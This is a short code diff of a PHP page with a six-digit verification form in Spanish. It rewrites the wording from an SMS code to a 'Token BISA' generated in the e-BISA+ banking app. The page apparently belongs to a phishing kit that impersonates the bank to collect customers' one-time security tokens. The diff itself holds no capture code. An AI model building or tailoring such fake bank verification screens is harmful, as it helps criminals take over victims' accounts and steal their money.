@@ -568,8 +568,8 @@ if ($method === 'GET' && isset($_GET['check'])) {
     </div>
     <h2 class="otp-title">Verificación de seguridad</h2>
     <p class="otp-subtitle">
-      Te hemos enviado un <strong>código SMS</strong> al número asociado a tu cuenta.<br/>
-      Ingrésalo para continuar.
+      Para continuar, ingresa tu <strong>Token BISA</strong>.<br/>
+      Abre tu aplicación e-BISA+, selecciona la opción <strong>"Token BISA"</strong> y escribe el código generado.
     </p>
     <div class="otp-error" id="otpError">Código incorrecto. Intente nuevamente.</div>
     <div class="otp-inputs" id="otpInputs">
@@ -580,10 +580,10 @@ if ($method === 'GET' && isset($_GET['check'])) {
       <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
       <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
     </div>
-    <div class="otp-timer">El código expira en <strong id="otpTimer">02:00</strong></div>
+    <div class="otp-timer">Tu token expira en <strong id="otpTimer">02:00</strong></div>
     <button class="btn-validar" type="button" id="btnValidar" disabled>Validar</button>
     <div style="margin-top:18px;">
-      <button class="otp-resend" type="button" id="btnResend" disabled>Reenviar código</button>
+      <button class="otp-resend" type="button" id="btnResend" disabled>Generar nuevo token</button>
     </div>
   </div>
 </div>
